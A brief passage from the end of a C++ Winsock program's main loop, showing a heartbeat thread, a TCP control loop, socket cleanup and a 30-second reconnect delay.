        g_hb_run.store(1);
        std::thread(heartbeat_loop).detach();
        tcp_control_loop();
        g_hb_run.store(0);
        closesocket(g_socket);
        g_socket = INVALID_SOCKET;
        Sleep(30000);
    }
    WSACleanup();
    return 0;
}
